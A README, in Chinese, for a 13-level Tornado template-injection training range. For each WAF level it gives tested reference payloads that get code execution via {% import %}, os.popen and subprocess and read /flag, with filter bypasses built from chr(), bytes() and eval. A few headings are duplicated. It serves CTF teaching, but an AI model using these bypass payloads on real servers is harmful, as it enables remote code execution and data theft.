# 04 · Tornado 13 关 WAF 链

| | |
|---|---|
| 端口 | `8094`（`TORNADO_CHAIN_PORT` 可改） |
| 引擎 | Tornado（`tornado.template.Template(...).generate()`） |
| 关卡数 | 13（id `0`–`12`） |
| 依赖网络 | 否 |
| flag | 容器内 `/flag`，由环境变量写入 |

## 这个靶场在教什么

Tornado 模板链的第三个引擎。**语法看起来像 Jinja（`{{ }}` / `{% %}`），求值模型
其实像 Mako（编译成 Python 模块）**，而且多了一批别处没有的起点。这就是它值得
单独一关的理由：同样一条 `{% import %}`，在 Tornado 里能直接导入模块拿 RCE，
在 Jinja2 里连语法都没有。

## Tornado 特有的起点（别处没有的）

实测 `POST /api/render`（`level=0`, `mode=god`）的返回值：

| 名字 | 它是什么 | 实测输出 |
|------|----------|----------|
| `escape` | 实为 `tornado.escape.xhtml_escape` —— **一个有 `__globals__` 的函数** | `<function xhtml_escape at 0x...>` |
| `datetime` | `datetime` 模块本身 | `<module 'datetime' from '/usr/local/lib/python3.11/datetime.py'>` |
| `request` | 渲染器注入的 Flask `request` 对象 | `<Request 'http://127.0.0.1:8094/api/render' [POST]>` |
| `handler` | 渲染器注入的 **Handler 桩**（`types.SimpleNamespace`） | `namespace(get_argument=<function ...>, get_secure_cookie=<function ...>, request=<Request ...>, reverse_url=<function ...>)` |
| `{% import %}` | **Tornado 独有**：直接导入模块 | `{% import os %}{{ os.popen('id').read() }}` → `uid=0(root) ...` |

三条要点：

1. **`handler` 是本项目注入的桩，不是真的 Handler。** 所以 `handler.settings`
   （真实 Tornado 站点里泄露 `cookie_secret` 的经典入口）在这里会报
   `AttributeError: 'types.SimpleNamespace' object has no attribute 'settings'`。
   它只有 `get_argument` / `get_secure_cookie` / `request` / `reverse_url` 四个成员，
   而且**这四个名字里 `get_argument` 含子串 `arg`**，从 L8（id 7）起就不可用。
2. **`escape.__globals__` 走的是 `tornado.escape` 模块的 globals**，里面**没有 `os`**
   （实测 `{{ escape.__globals__.os.popen('id') }}` →
   `AttributeError: 'dict' object has no attribute 'os'`）。但
   `escape.__globals__['__builtins__']['__import__']` 是通的 —— 也就是「要自己 import」。
3. **`{% import %}` 是最短的 RCE 路径**，实测：
   ```tornado
   {% import os %}{{ os.popen('id').read() }}                              → uid=0(root) ...
   {% import subprocess %}{{ subprocess.check_output(['/bin/cat','/flag']) }} → flag{doc_probe}
   ```
   `{% import %}` 里两个单词都不在 L8 的 12 个关键字里，所以它一路活到很后面。

## 关卡表

| id | 关卡 | 过滤内容 | 关键思路 |
|----|------|----------|----------|
| 0 | L1 无过滤 | — | `{{ }}` / `{% %}` / `{% import %}` 三面全开 |
| 1 | L2 拦截 `open` | 子串 `open`（`os.popen` 一并被拦） | 换 gadget：`subprocess.getoutput` 与 `{% import subprocess %}` 都不含 `open` |
| 2 | L3 盲渲染 | 无过滤，只回显 `correct`/`wrong` | 编译失败也落进 `wrong`，天然布尔信道 |
| 3 | L4 禁止方括号 | `[` `]` | 读全文不需要下标 |
| 4 | L5 禁止引号 | `'` `"` | `chr(47)+chr(102)+...` 拼路径 |
| 5 | L6 禁止下划线 | `_` | 「`open` + `chr` 拼串」这条链本来就不含下划线 |
| 6 | L7 禁止点号 | `.` | `getattr(obj, 'name')()` |
| 7 | L8 关键字黑名单 | 12 个子串 | `{% import subprocess %}` + `getoutput` / `check_output` |
| 8 | L9 禁止数字 | `0`–`9` | 路径链不需要数字；`True`/`len()` 可造整数 |
| 9 | L10 前缀置空 | 载荷前拼 `{% set config=None %}{% set self=None %}` | 换未置空的入口（`escape` / `handler` / `datetime`） |
| 10 | L11 组合过滤 | `' " + . [ ]` 与 `request` | 内置函数直接可用：`getattr` + `min(dict(kw))` + `str(bytes(…),'utf8')` |
| 11 | L12 强字符集 | 再加 `_`、数字、`\` | `os.sep` 就是 `/`；`dict(flag=True)` 白嫖文件名；`open` 直读 |
| 12 | L13 扩展关键字 | 符号 + `request/class/init/arg/config/app/self` | `{% from subprocess import getoutput %}` + `str(bytes(…),'utf8')`（数字仍可用） |

## 参考解

标注「✅ 实测」的全部经 `POST /api/render`（`mode=god`）在 `labs/04-tornado-chain`
镜像上实际执行过；flag 来自 `-e STATIC_FLAG='flag{doc_probe}'`。

### L1（id 0）无过滤 ✅

```tornado
{{ 7*7 }}                                             → 49
{{ open('/flag').read() }}                            → flag{doc_probe}
{% import os %}{{ os.popen('cat /flag').read() }}     → flag{doc_probe}
{% import subprocess %}{{ subprocess.check_output('id') }}          → uid=0(root) gid=0(root) groups=0(root)
{% import subprocess %}{{ subprocess.check_output(['/bin/cat','/flag']) }} → flag{doc_probe}
{{ escape.__globals__['__builtins__']['__import__']('os').popen('id').read() }}  → uid=0(root) ...
{{ datetime.datetime.now() }}                         → 2026-11-13 12:59:39.148302
```

### L2（id 1）拦截 `open` ✅

> 📝 **本关规则已修正**。旧版这里拦的是子串 `{{`，但 Tornado 模板只有 `{{ }}` 一种
> **表达式输出**构造，拦掉它等于把回显通道整个拿掉 —— 属于设计缺陷而非难度问题
> （完整成因见 `docs/SOLVABILITY.md` §2.1）。现已改为拦**可绕过的关键词**。

被拦的是子串 `open`：`open('/flag')` 写不了，连 `os.popen(...)` 也一并被拦
（`popen` 含 `open`）。但换一条 gadget 就绕过了 —— `{% import %}`、`__import__`
与 `subprocess.getoutput` 都不含被禁子串：

```tornado
{{ open('/flag') }}                                   → WAF（命中 `open`）
{{ os.popen('cat /flag') }}                           → WAF（`popen` 含 `open`）
{% import subprocess %}{{ subprocess.getoutput('cat /flag') }}   → flag{doc_probe}
{{ __import__('subprocess').getoutput('cat /flag') }}             → flag{doc_probe}
```

教学点：第一条过滤封掉「最顺手的那个函数」时，先想「**哪一条 gadget 链不含这个词**」，
而不是想办法绕过过滤本身。

### L3（id 2）盲渲染 ✅### L3（id 2）盲渲染 ✅

Tornado 模板编译失败同样落进 `wrong`：

```tornado
hello                    → ok:true,  output:"correct"（raw_output:"hello"）
{{ 1/+ }}                → ok:false, output:"wrong"（error:"SyntaxError: invalid syntax ... generated.py, line 4"）
{{ open('/flag').read() }} → ok:true, output:"correct"（raw_output:"flag{doc_probe}"，仅上帝模式可见）
```

### L4（id 3）禁止方括号 ✅

```tornado
{{ [1] }}                        → WAF
{{ open('/flag').read() }}        → flag{doc_probe}（压根不需要下标）
{{ list('ab') }}                  → ['a', 'b']（需要序列时用构造器，别写字面量）
```

### L5（id 4）禁止引号 ✅

```tornado
{{ open(chr(47)+chr(102)+chr(108)+chr(97)+chr(103)).read() }}   → flag{doc_probe}
```

Tornado 模板里有完整的 Python 内置函数，`chr` 直接可用，不需要先取 `__builtins__`。

### L6（id 5）禁止下划线 ✅

关键认知：**「`open` + `chr` 拼串」这条链本身一个下划线都没有**。

```tornado
{{ open('/flag').read() }}                                       → flag{doc_probe}
{{ open(chr(47)+chr(102)+chr(108)+chr(97)+chr(103)).read() }}   → flag{doc_probe}
{% if True %}yes{% end %}                                        → yes
```

反例：`{% import subprocess %}{{ subprocess.check_output(['id']) }}` 在这一关是
`WAF` —— 不是因为它要 import，而是**载荷里出现了 `__`**（这里是 `check_output`
与 `['id']` 无关，`_` 任一出现即拦）。

### L7（id 6）禁止点号 ✅

```tornado
{{ getattr(getattr(open('/flag'),'read'),'__call__')() }}   → flag{doc_probe}
```

注意这一关 `'read'` 的引号是允许的（引号在 id 4 才禁），
而 `open('/flag')['read']()` 这种**下标写法在 Tornado 里不成立**。

### L8（id 7）关键字子串黑名单 ✅

被禁：`class` `arg` `form` `value` `data` `request` `init` `global` `open` `mro` `base` `attr`。
实测的正例与反例：

```tornado
{{ open('/flag').read() }}                          → WAF（`open`）
{{ getattr(1,'x') }}                                → WAF（`attr`）
{{ request }}                                       → WAF
{{ handler.get_argument }}                          → WAF（`arg` 命中 `get_argument`）
{{ handler.request }}                               → WAF（`request`）
{{ escape.__globals__[...] }}                       → WAF（`global` 命中 `__globals__`）
{{ datetime }}                                      → <module 'datetime' ...>（可用）

# ✅ 正解：用 `{% import %}` + 不带被禁子串的调用
{% import subprocess %}{{ subprocess.check_output(['/bin/cat','/flag']) }}  → flag{doc_probe}
{% import subprocess %}{{ subprocess.check_output('cat</flag',shell=True) }} → flag{doc_probe}
{% import subprocess %}{{ subprocess.getoutput('cat /flag') }}              → flag{doc_probe}
```

三个细节：

- `check_output('cat /flag')`（不带 `shell=True`）会抛
  `FileNotFoundError: [Errno 2] No such file or directory: 'cat /flag'`
  —— 因为它不走 shell，把整串当成一个可执行文件名。要么传 argv 列表，要么加 `shell=True`。
- `subprocess.getoutput()` 走 `/bin/sh`，所以 `'cat /flag'` 直接用。
- `handler` 这个桩对象本身能用（`{{ handler }}` 不报错），
  但它的**方法名里带 `arg`**，所以从这一关起就没有价值了。

### L9（id 8）禁止数字 ✅

```tornado
{{ 7*7 }}                        → WAF（数字）
{{ True }}                       → True
{{ len('') }}                    → 0
{{ chr(True) }}                  → \x01
{{ open('/flag').read() }}       → flag{doc_probe}   ← 这条链不含数字
{% import os %}                  → ""（import 语句本身不含数字）
{% import os %}{{ os.popen('cat /flag').read() }}   → flag{doc_probe}
```

结论：**「禁数字」在 Tornado 里几乎不构成阻碍**，因为最短读文件链本来就不用数字。
只有当你想用 `chr()` 拼串时才需要先造整数。

### L10（id 9）前缀置空 config / self ✅

服务端在载荷前拼 `{% set config=None %}{% set self=None %}`：

```tornado
{{ 7*7 }}                        → 49
{{ config }}                     → None
{{ self }}                       → None
{{ escape }}                     → <function xhtml_escape at 0x...>
{{ open('/flag').read() }}       → flag{doc_probe}
```

被置空的是**这两个变量**，不是类型或命名空间；`escape` / `handler` / `datetime` /
`request` 都没受影响。

### L11（id 10）组合过滤 —— 硬关

过滤：`'` `"` `+` `.` `[` `]` 与子串 `request`。实测：

| 载荷 | 结果 |
|------|------|
| `{{ open('/flag').read() }}` | `WAF`（引号） |
| `{{ open(chr(47)+chr(102)) }}` | `WAF`（`+`） |
| `{{ request }}` | `WAF` |
| `{{ handler }}` | **可用** —— namespace 完整 |
| `{{ escape }}` | **可用** —— `<function xhtml_escape at 0x...>` |
| `{{ handler.get_secure_cookie }}` | `WAF`（属性名里带 `_`，与黑名单无关） |
| `{% import subprocess %}` | 空输出、不报错 |

`escape` / `handler` 这两个起点还在。而 Tornado 模板里 **Python 内置函数直接可用**
（`getattr` / `min` / `str` / `bytes`…），属性名与命令串各有现成通道
（容器内实测拿到 flag）：

```tornado
{% import os %}{{getattr(getattr(os,min(dict(popen=1)))(str(bytes((99,97,116,32,47,102,108,97,103)),min(dict(utf8=1)))),min(dict(read=1)))()}}
                                                     → flag{doc_probe}
```

* `min(dict(kw=1))` —— 对 dict 求最小值返回**键**：键名即字符串，无引号；
* `str(bytes((…)), 'utf8')` —— 无引号、无加号、无点号、无方括号地造出 `'cat /flag'`；
* `_` 在本关**没有**被禁，所以 `getattr` / `min` / `str` / `bytes` 都能写。

### L12（id 11）强字符集 —— 硬关（已解）### L12（id 11）强字符集 —— 硬关

过滤：`_` `.` `0-9` `\` `'` `"` `[` `]`。实测：

| 载荷 | 结果 |
|------|------|
| `{{ 7*7 }}` | `WAF`（数字） |
| `{{ open('/flag').read() }}` | `WAF`（引号） |
| `{{ open(chr(47)+...) }}` | `WAF`（`+` 与数字） |
| `{% import subprocess %}...` | `WAF`（`_`） |
| `{{ True }}` | `True` |
| `{{ escape }}` | `<function xhtml_escape at 0x...>` |
| `{{ datetime }}` | `<module 'datetime' ...>` |
| `{{ handler }}` | namespace 完整 |
| `{{ len('abc') }}` | `WAF`（引号） |
| `{% if True %}yes{% end %}` | `yes` |

数字被禁，但 `True` 没被禁、`+` 也没被禁 —— 路径里的 `/` 从 `os.sep` 拿
（`getattr(os, 'sep')` 不含任何被禁字符），文件名从键名白嫖：

```tornado
{% import os %}{{getattr(open(getattr(os,min(dict(sep=True)))+min(dict(flag=True))),min(dict(read=True)))()}}
                                                     → flag{doc_probe}
```

`4` 个字符的 `dict(sep=True)` 键名 `sep`、`flag` 同理；`open('/'+'flag')` 直读
flag 文件，连命令执行都不需要。容器内实测拿到 flag。

### L13（id 12）扩展关键字与符号 —— 硬关（已解）### L13（id 12）扩展关键字与符号 —— 硬关

过滤：符号 `_ . \ ' " + [ ]` 与子串 `request` `class` `init` `arg` `config` `app` `self`。实测：

| 载荷 | 结果 |
|------|------|
| `{{ 7*7 }}` | `49`（数字在这一关**不禁**） |
| `{{ True }}` | `True` |
| `{{ escape }}` | `<function xhtml_escape at 0x...>` |
| `{{ config }}` / `{{ self }}` / `{{ app }}` | `WAF` |
| `{% import subprocess %}` | 空输出、不报错 |
| `{% import subprocess %}{{ subprocess.check_output('id') }}` | `WAF`（`check_output` 的 `_`） |

注意 **`init` 会命中 `__init__` 这类名字**，但**不会**命中 `print`
（`print` 是 p-r-i-n-t，不含 `init`；这是本仓库早期文档里的一处笔误，已在
`shared/ssti_core/levels/jinja.py` 修正）。本关已有实测解：

`getattr` 含子串 `attr` 被禁、`_` 与 `.` 被禁 —— 但 **`{% from x import y %}` 语句
不在黑名单里**（Tornado 原生支持），数字也仍然可用，`str(bytes((…)), 'utf8')`
造串不需要任何被禁字符：

```tornado
{% from subprocess import getoutput %}
{{getoutput(str(bytes((99,97,116,32,47,102,108,97,103)),min(dict(utf8=1))))}}
                                                     → flag{doc_probe}
```

不依赖 from-import 的兜底：`{{eval(str(bytes((…)),min(dict(utf8=1))))}}` ——
`eval` 接受字符串源码，字节串内容对 WAF 完全不可见。两条都在容器内实测拿到 flag。

### 小结### 小结

| 难度带 | 关卡 | 状态 |
|--------|------|------|
| 有短解、已实测 | id 0–12（除 2 为盲关） | ✅ **13/13 全部可解**（`tests/audit_solvability.py` 容器内实测） |
| 盲信道，机制已验证 | id 2 | ✅（读数据需自己写盲提取） |

## 运行

```bash
# 1) 先构建统一前端镜像（只需一次）
scripts/build-frontend.sh            # Windows: scripts\build-frontend.ps1

# 2) 起靶场
cd labs/04-tornado-chain
docker compose up --build            # → http://127.0.0.1:8094

# 或仓库根目录一次起全部（01–07）
scripts/up-all.sh                    # Windows: scripts\up-all.ps1
```

## 直接调 API

```bash
curl -s localhost:8094/api/lab-info | jq '.levels[7]'
curl -s -X POST localhost:8094/api/render \
     -H 'Content-Type: application/json' \
     -d '{"level":"0","mode":"god","template":"{% import subprocess %}{{ subprocess.check_output(\"id\") }}"}' | jq
```

载荷长、引号多时，写进 JSON 文件再 `--data-binary @payload.json`。

## 上帝模式（出题人视角）

`mode=god` 额外返回 `template_after_waf` / `raw_output` / `error` / `exception_type` /
`waf_blocked` / `source_class`（语义见 `docs/API.md` §6）。
在 id 9（前缀置空）里，`template_after_waf` 能直接看到 `{% set config=None %}` 被拼上。

## 出题提示

- `handler` 是**本项目自造的桩**，不是真 Tornado Handler。真站点里
  `handler.settings['cookie_secret']` 是最常见的入口，但这里没有 `settings` ——
  如果想让靶场更贴近真实 Tornado 站点，可以给桩补一个 `settings` 字典
  （那会显著改变 id 7 之后的难度曲线）。
- `{% import %}` 是 Tornado 关的「万能后门」：L11–L13 的参考解都依赖它或
  `{% from %}`。想真正收紧难度，需要显式把 `import` 加入关键字表；
  否则字符黑名单对 `{% import %}` 形同虚设。
- 改任何 `WafSpec` 后跑 `python scripts/verify_labs.py 04` 更新探针期望值。
